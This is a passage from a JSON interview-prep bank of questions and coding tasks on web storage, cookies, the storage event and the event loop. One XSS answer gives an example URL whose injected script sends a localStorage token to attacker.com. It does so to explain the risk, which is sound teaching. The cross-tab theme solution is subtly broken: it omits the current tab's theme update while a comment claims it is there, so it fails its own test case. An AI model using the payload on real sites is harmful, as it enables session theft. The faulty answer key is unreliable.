          "example": "A multi-step form where data needs to be preserved if the user navigates within the same tab, but discarded if they close the tab or open a new one. `sessionStorage` is ideal for this.",
          "tags": [
            "Web APIs",
            "Client-Side Storage",
            "Use Cases"
          ],
          "prerequisites": [],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_web_storage_5",
          "topic": "Storage Event",
          "level": "medium",
          "type": "flashcard",
          "question": "Which of the three primary client-side storage mechanisms (Cookies, Local Storage, Session Storage) can trigger a `storage` event in other open tabs/windows of the same origin when its data changes?",
          "answer": "Local Storage",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Storage Event",
            "Local Storage",
            "Cross-tab communication"
          ],
          "evaluationCriteria": [
            "Recall of specific event-triggering behavior."
          ],
          "example": "",
          "tags": [
            "Web APIs",
            "Local Storage",
            "Events"
          ],
          "prerequisites": [],
          "complexity": 4,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_web_storage_6",
          "topic": "Cookie Sending with Requests",
          "level": "easy",
          "type": "flashcard",
          "question": "Which client-side storage mechanism automatically sends its data with every HTTP request to its associated domain?",
          "answer": "Cookies",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Cookies",
            "HTTP Requests",
            "Automatic sending"
          ],
          "evaluationCriteria": [
            "Recall of data transmission behavior."
          ],
          "example": "",
          "tags": [
            "Web APIs",
            "Cookies",
            "HTTP"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_web_storage_7",
          "topic": "Security Vulnerabilities",
          "level": "hard",
          "type": "open",
          "question": "Both Local Storage and Session Storage are vulnerable to Cross-Site Scripting (XSS) attacks if not handled carefully, unlike HttpOnly cookies. Explain why this is the case and provide a brief example of how an XSS attack could exploit this.",
          "answer": "Local Storage and Session Storage are inherently accessible via JavaScript from the same origin (`window.localStorage` and `window.sessionStorage`). If a website is vulnerable to an XSS attack, an attacker can inject malicious client-side script (e.g., via a reflected XSS vulnerability in a URL parameter or a stored XSS in a user comment).\n\nThis injected script runs with the same permissions as legitimate site scripts, meaning it can access, read, and exfiltrate any data stored in `localStorage` or `sessionStorage` to an attacker's server.\n\n**Example:**\nIf a vulnerable site displays user input directly without proper sanitization:\n`https://example.com/search?query=<script>fetch('https://attacker.com/steal?data='+encodeURIComponent(localStorage.getItem('user_token')));</script>`\n\nWhen a victim visits this URL, the injected `<script>` tag executes, reading the `user_token` from their `localStorage` and sending it to `attacker.com`. If `HttpOnly` was used for a cookie, the attacker's script could not access that cookie, thus limiting the damage.",
          "options": [],
          "analysisPoints": [
            "Explanation of JavaScript accessibility for Local/Session Storage.",
            "Connection to XSS vulnerability (script injection).",
            "How injected script gains access to stored data.",
            "Concrete example demonstrating data exfiltration.",
            "Implicit comparison with HttpOnly cookie security."
          ],
          "keyConcepts": [
            "Local Storage",
            "Session Storage",
            "XSS",
            "Security Vulnerabilities",
            "JavaScript accessibility",
            "HttpOnly"
          ],
          "evaluationCriteria": [
            "Deep understanding of client-side storage security models.",
            "Ability to explain XSS mechanism and its impact on storage.",
            "Providing a relevant and concise example.",
            "Distinguishing security properties from cookies."
          ],
          "example": "",
          "tags": [
            "Web APIs",
            "Security",
            "XSS",
            "Local Storage",
            "Session Storage",
            "Frontend Security"
          ],
          "prerequisites": [
            "Understanding of XSS attacks",
            "Web Storage API basics"
          ],
          "complexity": 9,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_web_storage_8",
          "topic": "Using Web Storage APIs",
          "level": "medium",
          "type": "code",
          "question": "Write JavaScript code to do the following:\n1. Store a user's chosen theme ('dark' or 'light') in a way that it persists across browser sessions.\n2. Retrieve the user's theme preference. If no preference is found, default to 'light'.\n3. Allow the user to toggle the theme and save the new preference.",
          "answer": "```javascript\n// 1. Store user's chosen theme persistently\nfunction saveThemePreference(theme: 'dark' | 'light'): void {\n  localStorage.setItem('userTheme', theme);\n  console.log(`Theme preference saved: ${theme}`);\n}\n\n// 2. Retrieve user's theme preference, default to 'light'\nfunction getThemePreference(): 'dark' | 'light' {\n  const storedTheme = localStorage.getItem('userTheme');\n  return (storedTheme === 'dark' || storedTheme === 'light') ? storedTheme : 'light';\n}\n\n// 3. Allow toggling and saving new preference\nfunction toggleTheme(): void {\n  let currentTheme = getThemePreference();\n  let newTheme: 'dark' | 'light' = (currentTheme === 'light') ? 'dark' : 'light';\n  saveThemePreference(newTheme);\n  // Apply theme to UI (e.g., add/remove a class to body)\n  document.body.className = newTheme + '-theme';\n  console.log(`Theme toggled to: ${newTheme}`);\n}\n\n// Initial application of theme on load\ndocument.addEventListener('DOMContentLoaded', () => {\n  const initialTheme = getThemePreference();\n  document.body.className = initialTheme + '-theme';\n  console.log(`Initial theme applied: ${initialTheme}`);\n});\n\n// Example usage (assuming a button exists with id 'toggleThemeBtn')\n// const toggleButton = document.getElementById('toggleThemeBtn');\n// if (toggleButton) {\n//   toggleButton.addEventListener('click', toggleTheme);\n// }\n```",
          "options": [],
          "analysisPoints": [
            "Correct use of `localStorage.setItem` and `localStorage.getItem`.",
            "Handling of default values when no item is found.",
            "Demonstrating updating existing items.",
            "Correct use of `JSON.stringify`/`JSON.parse` if storing objects (not strictly needed for simple strings here, but good to mention for more complex data).",
            "Applying the theme to a hypothetical UI element for practical relevance."
          ],
          "keyConcepts": [
            "Local Storage",
            "setItem",
            "getItem",
            "Persistence",
            "User Preferences",
            "Default values"
          ],
          "evaluationCriteria": [
            "Functional correctness of storage operations.",
            "Robustness in handling missing data (defaulting).",
            "Clarity and organization of code.",
            "Practical application of `localStorage`."
          ],
          "example": "",
          "tags": [
            "Web APIs",
            "Local Storage",
            "Coding Challenge",
            "User Experience"
          ],
          "prerequisites": [
            "Local Storage API",
            "Basic JavaScript functions"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_web_storage_9",
          "topic": "document.cookie vs. localStorage/sessionStorage APIs",
          "level": "medium",
          "type": "open",
          "question": "Describe the key differences in how you interact with `document.cookie` compared to `localStorage` or `sessionStorage` APIs, especially regarding reading and writing values.",
          "answer": "`document.cookie`:\n-   **Reading**: Returns a single string containing all cookies for the current document, semicolon-separated (`key=value; key2=value2`). You must manually parse this string to extract individual cookie values.\n-   **Writing**: Assignment (`document.cookie = 'key=value';`) appends or updates a single cookie within the existing cookie string. You must also manually include attributes like `expires`, `path`, `domain`, `Secure`, `HttpOnly`, `SameSite` in the string when setting.\n-   **Deletion**: Done by setting a cookie with the same name and path, but an `expires` date in the past.\n\n`localStorage` / `sessionStorage`:\n-   **Reading**: Uses `storage.getItem('key')` which directly returns the value associated with that key, or `null` if not found. No parsing of a large string is required.\n-   **Writing**: Uses `storage.setItem('key', 'value')` which directly sets or updates a key-value pair. Values are always stored as strings, so objects/arrays require `JSON.stringify()` before storing and `JSON.parse()` after retrieving.\n-   **Deletion**: `storage.removeItem('key')` for a specific item, or `storage.clear()` to remove all items for the origin.\n\nIn essence, `document.cookie` is a lower-level, less convenient string-based API that requires manual parsing and formatting, while `localStorage` and `sessionStorage` provide a more intuitive key-value store interface.",
          "options": [],
          "analysisPoints": [
            "Detailed comparison of read/write methods.",
            "Highlighting manual parsing for cookies.",
            "Explicitly mentioning cookie attributes vs. direct key-value for Web Storage.",
            "Deletion mechanisms.",
            "Mentioning JSON (de)serialization for complex data in Web Storage."
          ],
          "keyConcepts": [
            "document.cookie",
            "localStorage",
            "sessionStorage",
            "API differences",
            "Reading data",
            "Writing data",
            "Data serialization"
          ],
          "evaluationCriteria": [
            "Thorough understanding of API differences.",
            "Ability to articulate practical implications (e.g., parsing, JSON).",
            "Clarity and accuracy in technical description."
          ],
          "example": "",
          "tags": [
            "Web APIs",
            "Client-Side Storage",
            "API Comparison",
            "JavaScript"
          ],
          "prerequisites": [
            "Understanding of all three storage mechanisms"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        }
      ],
      "tasks": [
        {
          "id": "task_event_loop_1",
          "title": "Simulate Asynchronous UI Updates and Long-Running Tasks",
          "description": "\nImplement a web page with a simple UI that demonstrates the non-blocking nature of JavaScript's event loop when handling asynchronous tasks.\n\n**Requirements:**\n1.  **HTML Structure**: Create a button, a status display area (e.g., a `<div>` or `<p>`), and a result display area.\n2.  **Start Button**: When clicked, it should:\n    *   Immediately update the status display to 'Processing...'.\n    *   Start a simulated long-running, CPU-intensive task (e.g., a `for` loop iterating millions of times).\n    *   After the long-running task completes, update the result display with the task's outcome.\n    *   Finally, update the status display to 'Done'.\n3.  **Ensure Responsiveness**: The UI (specifically the 'Processing...' status) must appear *before* the long-running task starts and blocks the main thread. If the task is synchronous, the UI will freeze. You need to use `setTimeout(0)` or similar asynchronous mechanisms to achieve this.\n4.  **No Blocking**: The long-running task should not block the initial UI update, even if it runs on the main thread.\n\n**Goal**: Visually confirm that the 'Processing...' message renders before the browser becomes unresponsive due to the heavy computation.",
          "difficulty": "medium",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Event Loop Task</title>\n    <style>\n        body { font-family: sans-serif; margin: 20px; }\n        #status { font-weight: bold; margin-top: 10px; }\n        #result { color: green; margin-top: 5px; }\n        button { padding: 10px 15px; cursor: pointer; }\n    </style>\n</head>\n<body>\n    <h1>Asynchronous Task Demonstration</h1>\n    <button id=\"startButton\">Start Heavy Task</button>\n    <div id=\"status\">Idle</div>\n    <div id=\"result\"></div>\n\n    <script>\n        const startButton = document.getElementById('startButton');\n        const statusDiv = document.getElementById('status');\n        const resultDiv = document.getElementById('result');\n\n        function performHeavyCalculation() {\n            // Simulate a CPU-intensive task\n            let sum = 0;\n            for (let i = 0; i < 500000000; i++) { // Adjust count for noticeable delay\n                sum += i;\n            }\n            return sum;\n        }\n\n        startButton.addEventListener('click', () => {\n            // TODO: Implement the logic here\n            // 1. Update status to 'Processing...'\n            // 2. Schedule the heavy calculation using setTimeout(0)\n            // 3. Inside the setTimeout callback, perform calculation, update result, then update status to 'Done'\n        });\n    </script>\n</body>\n</html>\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Event Loop Task</title>\n    <style>\n        body { font-family: sans-serif; margin: 20px; }\n        #status { font-weight: bold; margin-top: 10px; }\n        #result { color: green; margin-top: 5px; }\n        button { padding: 10px 15px; cursor: pointer; }\n    </style>\n</head>\n<body>\n    <h1>Asynchronous Task Demonstration</h1>\n    <button id=\"startButton\">Start Heavy Task</button>\n    <div id=\"status\">Idle</div>\n    <div id=\"result\"></div>\n\n    <script>\n        const startButton = document.getElementById('startButton');\n        const statusDiv = document.getElementById('status');\n        const resultDiv = document.getElementById('result');\n\n        function performHeavyCalculation() {\n            let sum = 0;\n            for (let i = 0; i < 500000000; i++) { \n                sum += i;\n            }\n            return sum;\n        }\n\n        startButton.addEventListener('click', () => {\n            // Step 1: Immediately update status. This is synchronous and renders before script continues.\n            statusDiv.textContent = 'Processing...';\n            resultDiv.textContent = ''; // Clear previous result\n            startButton.disabled = true; // Disable button to prevent multiple clicks\n\n            // Step 2 & 3: Schedule the heavy calculation to run AFTER the current Call Stack clears\n            // This allows the browser to render 'Processing...' before the heavy task starts.\n            setTimeout(() => {\n                const startTime = performance.now();\n                const calculationResult = performHeavyCalculation();\n                const endTime = performance.now();\n                const duration = ((endTime - startTime) / 1000).toFixed(2);\n\n                resultDiv.textContent = `Calculation complete: ${calculationResult} (took ${duration} seconds)`;\n                statusDiv.textContent = 'Done';\n                startButton.disabled = false;\n                console.log('Heavy calculation finished and UI updated.');\n            }, 0); \n\n            console.log('Button click handler finished, calculation scheduled.');\n        });\n    </script>\n</body>\n</html>\n",
          "testCases": [
            "Clicking the 'Start Heavy Task' button should immediately change the status to 'Processing...'.",
            "The browser tab should not visibly freeze or become unresponsive before 'Processing...' appears.",
            "After a noticeable delay, the result area should update with the calculation result, and the status should change to 'Done'.",
            "The button should be disabled during processing and re-enabled after completion.",
            "Open browser developer tools, go to the 'Performance' tab, and record. Verify that the heavy calculation appears as a long task block *after* the initial DOM updates (layout/paint) for 'Processing...'. This visually confirms the deferral."
          ],
          "hints": [
            "Remember that JavaScript is single-threaded. To prevent UI blocking, you need to allow the browser's rendering engine a chance to update the DOM.",
            "The `setTimeout(callback, 0)` trick is specifically designed for situations where you want to defer a task until *after* the current synchronous execution context completes, including any pending rendering updates."
          ],
          "tags": [
            "JavaScript",
            "Event Loop",
            "Asynchronous",
            "UI Responsiveness",
            "Performance",
            "Web APIs"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "HTML/CSS Basics",
            "DOM Manipulation",
            "Understanding of `setTimeout`",
            "Theory: Event Loop and Asynchronous JavaScript"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Call Stack",
            "Callback Queue",
            "Web APIs",
            "Browser Rendering"
          ]
        },
        {
          "id": "task_web_storage_1",
          "title": "Build a Shopping Cart with Local Storage",
          "description": "\nCreate a simple web page that simulates a shopping cart functionality using `localStorage` to persist the cart items.\n\n**Requirements:**\n1.  **HTML Structure**: Display a list of available products (e.g., 'Laptop', 'Mouse', 'Keyboard'). Each product should have an 'Add to Cart' button.\n2.  **Cart Display**: Show the current items in the cart on the same page, including the quantity of each item. An empty cart message should be displayed when applicable.\n3.  **Add to Cart**: When a product's 'Add to Cart' button is clicked:\n    *   Add the product to the cart or increment its quantity if already present.\n    *   Update the `localStorage` to reflect the new cart state.\n    *   Update the cart display on the page.\n4.  **Persistence**: The cart items should remain in `localStorage` even if the user closes and reopens the browser or navigates away and comes back to the page.\n5.  **Clear Cart**: Add a 'Clear Cart' button that removes all items from the cart, clears `localStorage`, and updates the display.\n\n**Data Structure**: Store the cart as an array of objects in `localStorage`, where each object has `id`, `name`, and `quantity` properties (e.g., `[{ id: 'prod1', name: 'Laptop', quantity: 1 }]`).",
          "difficulty": "medium",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Shopping Cart</title>\n    <style>\n        body { font-family: sans-serif; margin: 20px; display: flex; gap: 40px; }\n        .products, .cart { border: 1px solid #ccc; padding: 15px; border-radius: 5px; min-width: 300px; }\n        h2 { margin-top: 0; }\n        ul { list-style: none; padding: 0; }\n        li { margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }\n        button { padding: 5px 10px; cursor: pointer; }\n        #clearCartBtn { margin-top: 20px; background-color: #f44336; color: white; border: none; }\n    </style>\n</head>\n<body>\n    <div class=\"products\">\n        <h2>Available Products</h2>\n        <ul id=\"productList\">\n            <li data-id=\"prod1\" data-name=\"Laptop\">Laptop <button>Add to Cart</button></li>\n            <li data-id=\"prod2\" data-name=\"Mouse\">Mouse <button>Add to Cart</button></li>\n            <li data-id=\"prod3\" data-name=\"Keyboard\">Keyboard <button>Add to Cart</button></li>\n        </ul>\n    </div>\n\n    <div class=\"cart\">\n        <h2>Your Cart</h2>\n        <ul id=\"cartItems\">\n            <!-- Cart items will be rendered here -->\n        </ul>\n        <p id=\"emptyCartMessage\">Your cart is empty.</p>\n        <button id=\"clearCartBtn\">Clear Cart</button>\n    </div>\n\n    <script>\n        const productList = document.getElementById('productList');\n        const cartItemsList = document.getElementById('cartItems');\n        const emptyCartMessage = document.getElementById('emptyCartMessage');\n        const clearCartBtn = document.getElementById('clearCartBtn');\n\n        // Type definition for a cart item\n        // interface CartItem { id: string; name: string; quantity: number; }\n\n        // Function to load cart from localStorage\n        function loadCart() {\n            const cartString = localStorage.getItem('shoppingCart');\n            return cartString ? JSON.parse(cartString) : [];\n        }\n\n        // Function to save cart to localStorage\n        function saveCart(cart) {\n            localStorage.setItem('shoppingCart', JSON.stringify(cart));\n        }\n\n        // Function to render cart items to the DOM\n        function renderCart(cart) {\n            cartItemsList.innerHTML = ''; // Clear current display\n            if (cart.length === 0) {\n                emptyCartMessage.style.display = 'block';\n            } else {\n                emptyCartMessage.style.display = 'none';\n                cart.forEach(item => {\n                    const li = document.createElement('li');\n                    li.textContent = `${item.name} (x${item.quantity})`;\n                    cartItemsList.appendChild(li);\n                });\n            }\n        }\n\n        // Event listener for adding items to cart\n        productList.addEventListener('click', (event) => {\n            if (event.target.tagName === 'BUTTON') {\n                const productLi = event.target.closest('li');\n                const productId = productLi.dataset.id;\n                const productName = productLi.dataset.name;\n\n                // TODO: Implement logic to add product to cart:\n                // 1. Load current cart.\n                // 2. Check if product exists; if so, increment quantity.\n                // 3. If not, add new product with quantity 1.\n                // 4. Save updated cart to localStorage.\n                // 5. Re-render cart.\n            }\n        });\n\n        // Event listener for clearing the cart\n        clearCartBtn.addEventListener('click', () => {\n            // TODO: Implement logic to clear cart:\n            // 1. Clear cart in localStorage.\n            // 2. Re-render cart (should show empty message).\n        });\n\n        // Initialize cart on page load\n        document.addEventListener('DOMContentLoaded', () => {\n            renderCart(loadCart());\n        });\n    </script>\n</body>\n</html>\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Shopping Cart</title>\n    <style>\n        body { font-family: sans-serif; margin: 20px; display: flex; gap: 40px; }\n        .products, .cart { border: 1px solid #ccc; padding: 15px; border-radius: 5px; min-width: 300px; }\n        h2 { margin-top: 0; }\n        ul { list-style: none; padding: 0; }\n        li { margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }\n        button { padding: 5px 10px; cursor: pointer; }\n        #clearCartBtn { margin-top: 20px; background-color: #f44336; color: white; border: none; }\n    </style>\n</head>\n<body>\n    <div class=\"products\">\n        <h2>Available Products</h2>\n        <ul id=\"productList\">\n            <li data-id=\"prod1\" data-name=\"Laptop\">Laptop <button>Add to Cart</button></li>\n            <li data-id=\"prod2\" data-name=\"Mouse\">Mouse <button>Add to Cart</button></li>\n            <li data-id=\"prod3\" data-name=\"Keyboard\">Keyboard <button>Add to Cart</button></li>\n        </ul>\n    </div>\n\n    <div class=\"cart\">\n        <h2>Your Cart</h2>\n        <ul id=\"cartItems\">\n            <!-- Cart items will be rendered here -->\n        </ul>\n        <p id=\"emptyCartMessage\">Your cart is empty.</p>\n        <button id=\"clearCartBtn\">Clear Cart</button>\n    </div>\n\n    <script>\n        const productList = document.getElementById('productList');\n        const cartItemsList = document.getElementById('cartItems');\n        const emptyCartMessage = document.getElementById('emptyCartMessage');\n        const clearCartBtn = document.getElementById('clearCartBtn');\n\n        // Interface for a cart item (for clarity, not strictly needed for vanilla JS)\n        // type CartItem = { id: string; name: string; quantity: number; };\n\n        // Function to load cart from localStorage\n        function loadCart() {\n            const cartString = localStorage.getItem('shoppingCart');\n            try {\n                return cartString ? JSON.parse(cartString) : [];\n            } catch (e) {\n                console.error(\"Error parsing cart from localStorage:\", e);\n                return []; // Return empty cart on parse error\n            }\n        }\n\n        // Function to save cart to localStorage\n        function saveCart(cart) {\n            localStorage.setItem('shoppingCart', JSON.stringify(cart));\n        }\n\n        // Function to render cart items to the DOM\n        function renderCart(cart) {\n            cartItemsList.innerHTML = ''; // Clear current display\n            if (cart.length === 0) {\n                emptyCartMessage.style.display = 'block';\n            } else {\n                emptyCartMessage.style.display = 'none';\n                cart.forEach(item => {\n                    const li = document.createElement('li');\n                    li.textContent = `${item.name} (x${item.quantity})`;\n                    cartItemsList.appendChild(li);\n                });\n            }\n        }\n\n        // Event listener for adding items to cart\n        productList.addEventListener('click', (event) => {\n            if (event.target.tagName === 'BUTTON') {\n                const productLi = event.target.closest('li');\n                if (!productLi) return; // Ensure a product li was clicked\n                const productId = productLi.dataset.id;\n                const productName = productLi.dataset.name;\n\n                let cart = loadCart();\n                const existingItem = cart.find(item => item.id === productId);\n\n                if (existingItem) {\n                    existingItem.quantity++;\n                } else {\n                    cart.push({ id: productId, name: productName, quantity: 1 });\n                }\n\n                saveCart(cart);\n                renderCart(cart);\n            }\n        });\n\n        // Event listener for clearing the cart\n        clearCartBtn.addEventListener('click', () => {\n            localStorage.removeItem('shoppingCart'); // Or localStorage.clear() if it's the only item\n            renderCart([]); // Render with an empty array\n        });\n\n        // Initialize cart on page load\n        document.addEventListener('DOMContentLoaded', () => {\n            renderCart(loadCart());\n        });\n    </script>\n</body>\n</html>\n",
          "testCases": [
            "Adding a new product: Click 'Add to Cart' for 'Laptop'. 'Laptop (x1)' should appear in the cart.",
            "Adding an existing product: Click 'Add to Cart' for 'Laptop' again. 'Laptop (x2)' should appear.",
            "Persistence: Add items, then close and reopen the browser tab. The items should still be in the cart.",
            "Clear cart: Click 'Clear Cart'. The cart display should show 'Your cart is empty.'",
            "Multiple items: Add 'Laptop', 'Mouse', then 'Laptop' again. Cart should show 'Mouse (x1)', 'Laptop (x2)'.",
            "Invalid JSON in localStorage: Manually corrupt 'shoppingCart' in dev tools (e.g., set to 'abc'). Reload page. Cart should load as empty (due to `try...catch`) without errors."
          ],
          "hints": [
            "Remember that `localStorage` only stores strings. You'll need `JSON.stringify()` to save objects/arrays and `JSON.parse()` to retrieve them.",
            "When adding a product, check if it already exists in the cart array. If it does, increment its `quantity`; otherwise, add a new item.",
            "Ensure your `renderCart` function completely re-renders the cart to reflect the latest state from `localStorage`."
          ],
          "tags": [
            "Web APIs",
            "Local Storage",
            "DOM Manipulation",
            "Frontend Development",
            "Data Persistence"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "HTML/CSS Basics",
            "DOM Manipulation",
            "JSON Serialization/Deserialization",
            "Array methods (`find`, `push`)"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Client-Side Storage",
            "User Experience",
            "State Management (basic)"
          ]
        },
        {
          "id": "task_web_storage_2",
          "title": "Cross-Tab Theme Synchronization with Storage Events",
          "description": "\nCreate a web page that allows a user to switch themes (light/dark) and synchronize this theme preference across all open tabs/windows of the same origin using `localStorage` and `storage` events.\n\n**Requirements:**\n1.  **HTML Structure**: A button to toggle the theme and a display area to show the current theme (e.g., 'Current Theme: Dark'). The `body` element should have a class that indicates the current theme (e.g., `dark-theme` or `light-theme`).\n2.  **Initial Theme Load**: On page load, the theme should be loaded from `localStorage`. If no preference is found, default to 'light'.\n3.  **Theme Toggle**: Clicking the button should toggle the theme, update `localStorage`, and apply the new theme class to the `body`.\n4.  **Cross-Tab Synchronization**: When the theme is changed in one tab, all other open tabs/windows from the same origin should automatically update their theme to match, without requiring a page reload in those tabs.\n\n**Hint**: Use the `storage` event listener on `window` to detect changes made by other tabs.",
          "difficulty": "hard",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Theme Synchronizer</title>\n    <style>\n        body {\n            font-family: sans-serif;\n            margin: 20px;\n            transition: background-color 0.3s, color 0.3s;\n        }\n        .light-theme {\n            background-color: #f0f0f0;\n            color: #333;\n        }\n        .dark-theme {\n            background-color: #333;\n            color: #f0f0f0;\n        }\n        button { padding: 10px 15px; cursor: pointer; margin-top: 15px; }\n    </style>\n</head>\n<body>\n    <h1>Theme Synchronization</h1>\n    <p>Current Theme: <span id=\"currentThemeDisplay\"></span></p>\n    <button id=\"toggleThemeBtn\">Toggle Theme</button>\n\n    <script>\n        const themeKey = 'userPreferredTheme'; // Key for localStorage\n        const toggleThemeBtn = document.getElementById('toggleThemeBtn');\n        const currentThemeDisplay = document.getElementById('currentThemeDisplay');\n\n        // Function to apply a theme to the body\n        function applyTheme(theme) {\n            document.body.classList.remove('light-theme', 'dark-theme');\n            document.body.classList.add(`${theme}-theme`);\n            currentThemeDisplay.textContent = theme.charAt(0).toUpperCase() + theme.slice(1); // Capitalize\n        }\n\n        // Function to get current theme from localStorage or default\n        function getStoredTheme() {\n            return localStorage.getItem(themeKey) || 'light';\n        }\n\n        // Function to toggle and save theme\n        function toggleAndSaveTheme() {\n            let currentTheme = getStoredTheme();\n            let newTheme = currentTheme === 'light' ? 'dark' : 'light';\n            localStorage.setItem(themeKey, newTheme); // Save to localStorage\n            applyTheme(newTheme); // Apply immediately to current tab\n        }\n\n        // Event listener for button click\n        toggleThemeBtn.addEventListener('click', toggleAndSaveTheme);\n\n        // TODO: Add an event listener for 'storage' events here\n        // This listener should update the theme if it was changed in another tab.\n\n        // Initial load: Apply the stored theme\n        document.addEventListener('DOMContentLoaded', () => {\n            applyTheme(getStoredTheme());\n        });\n    </script>\n</body>\n</html>\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Theme Synchronizer</title>\n    <style>\n        body {\n            font-family: sans-serif;\n            margin: 20px;\n            transition: background-color 0.3s, color 0.3s;\n        }\n        .light-theme {\n            background-color: #f0f0f0;\n            color: #333;\n        }\n        .dark-theme {\n            background-color: #333;\n            color: #f0f0f0;\n        }\n        button { padding: 10px 15px; cursor: pointer; margin-top: 15px; }\n    </style>\n</head>\n<body>\n    <h1>Theme Synchronization</h1>\n    <p>Current Theme: <span id=\"currentThemeDisplay\"></span></p>\n    <button id=\"toggleThemeBtn\">Toggle Theme</button>\n\n    <script>\n        const themeKey = 'userPreferredTheme'; // Key for localStorage\n        const toggleThemeBtn = document.getElementById('toggleThemeBtn');\n        const currentThemeDisplay = document.getElementById('currentThemeDisplay');\n\n        // Function to apply a theme to the body\n        function applyTheme(theme) {\n            document.body.classList.remove('light-theme', 'dark-theme');\n            document.body.classList.add(`${theme}-theme`);\n            currentThemeDisplay.textContent = theme.charAt(0).toUpperCase() + theme.slice(1); // Capitalize\n        }\n\n        // Function to get current theme from localStorage or default\n        function getStoredTheme() {\n            return localStorage.getItem(themeKey) || 'light';\n        }\n\n        // Function to toggle and save theme\n        function toggleAndSaveTheme() {\n            let currentTheme = getStoredTheme();\n            let newTheme = currentTheme === 'light' ? 'dark' : 'light';\n            localStorage.setItem(themeKey, newTheme); // Save to localStorage\n            // Note: applyTheme(newTheme) is called here for the current tab.\n            // The storage event listener will handle other tabs.\n        }\n\n        // Event listener for button click\n        toggleThemeBtn.addEventListener('click', toggleAndSaveTheme);\n\n        // Event listener for 'storage' events (for cross-tab synchronization)\n        window.addEventListener('storage', (event) => {\n            // Check if the changed key is our theme key and it's from localStorage\n            if (event.key === themeKey && event.storageArea === localStorage) {\n                // Update the theme in this tab based on the new value from the event\n                const newTheme = event.newValue || 'light'; // event.newValue will be null if item was removed\n                applyTheme(newTheme);\n                console.log(`Theme synchronized from another tab: ${newTheme}`);\n            }\n        });\n\n        // Initial load: Apply the stored theme\n        document.addEventListener('DOMContentLoaded', () => {\n            applyTheme(getStoredTheme());\n        });\n    </script>\n</body>\n</html>\n",
          "testCases": [
            "Initial load: Open the page. It should default to 'light' theme if no preference is stored, or load the last saved preference.",
            "Toggle in one tab: Click 'Toggle Theme' button. The theme should switch (e.g., light -> dark), and the display should update.",
            "Cross-tab synchronization: Open the same page in two browser tabs. Toggle the theme in Tab A. Tab B should automatically update its theme and display without refresh.",
            "Multiple toggles: Rapidly toggle the theme multiple times in one tab, ensure other tabs keep up.",
            "Clear localStorage: Clear `localStorage` in dev tools, then reload. Page should revert to 'light' theme."
          ],
          "hints": [
            "The `storage` event is fired on `window` when a `localStorage` item is changed in *another* tab/window from the same origin. It is *not* fired in the tab that made the change.",
            "The `event` object of the `storage` event contains `key`, `oldValue`, `newValue`, `url`, and `storageArea` properties, which are useful for identifying what changed and where.",
            "Make sure your `applyTheme` function correctly updates both the `body` class and the text display."
          ],
          "tags": [
            "Web APIs",
            "Local Storage",
            "Storage Event",
            "Cross-Tab Communication",
            "Frontend Architecture",
            "User Experience"
          ],
          "timeEstimate": 75,
          "prerequisites": [
            "HTML/CSS Basics",
            "DOM Manipulation",
            "Understanding of Local Storage",
            "Event Listeners"
          ],
          "complexity": 8,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "relatedConcepts": [
            "Client-Side Storage",
            "Browser APIs",
            "Event Handling",
            "State Synchronization"
          ]
        }
      ]
    }
  },
  {
    "id": "135b9b5c-1aa9-4283-a8ee-0df0fb5b6daf",
    "startLine": 11000,
    "endLine": 11099,
    "processedDate": "2025-06-17T11:58:35.402Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_web_storage_event_listener",
          "title": "Web Storage: The 'storage' Event Listener",
          "content": "The `storage` event in web browsers allows different browser windows or tabs from the same origin to react to changes made in `localStorage` or `sessionStorage` by another window/tab. This event is *only* triggered when a storage item is changed, added, or removed by *another* window/tab from the same origin. It does not fire for changes made within the same window that initiated the change. It's a powerful mechanism for synchronizing state across multiple browser contexts.\n\n## Event Properties\nWhen the `storage` event fires, the event object provides several useful properties:\n- `key`: The key of the storage item that was changed.\n- `oldValue`: The old value of the key, or `null` if the key was newly added.\n- `newValue`: The new value of the key, or `null` if the key was removed.\n- `url`: The URL of the document whose storage changed.\n- `storageArea`: The `Storage` object (`localStorage` or `sessionStorage`) that was affected.\n\nThis event is crucial for building real-time collaboration features or ensuring data consistency across multiple open tabs of a web application without needing server-side communication.",
